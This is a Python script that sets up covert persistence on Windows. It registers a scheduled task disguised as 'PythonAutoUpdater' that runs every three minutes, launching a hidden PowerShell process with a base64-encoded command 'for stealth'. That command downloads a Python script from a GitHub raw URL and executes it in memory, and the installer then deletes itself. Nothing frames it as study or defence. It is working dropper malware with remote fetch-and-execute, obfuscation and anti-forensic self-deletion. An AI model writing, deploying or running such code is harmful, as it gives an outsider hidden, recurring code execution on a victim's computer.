import os
import subprocess
import sys
import time
import base64

# Scheduled Task Name
task_name = "PythonAutoUpdater"

# Direct GitHub raw link to the Python script
python_script_url = "https://raw.githubusercontent.com/davidkennedy02/gaslight/main/surprise.py"

# Step 1: Define the PowerShell command to download & execute the Python script in memory
powershell_command = f'''
$URL = "{python_script_url}";
$Response = Invoke-WebRequest -Uri $URL -UseBasicParsing;
$PythonScript = $Response.Content;
$PythonPath = (Get-Command pythonw.exe).Source;
Invoke-Expression "& $PythonPath -c `"$PythonScript`"";
'''

# Step 2: Encode PowerShell command in Base64 for stealth & compatibility
powershell_bytes = powershell_command.encode("utf-16le")
powershell_encoded = base64.b64encode(powershell_bytes).decode()

# Step 3: Create the scheduled task (fixed command!)
create_task_command = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand {powershell_encoded}" /sc minute /mo 3 /f /rl lowest /IT
"""

# Execute the scheduled task creation command
os.system(create_task_command)

# Step 4: Self-delete setup script (optional)
current_script_path = os.path.realpath(__file__)
time.sleep(2)
subprocess.Popen(f'cmd.exe /c del "{current_script_path}"', shell=True)
sys.exit()
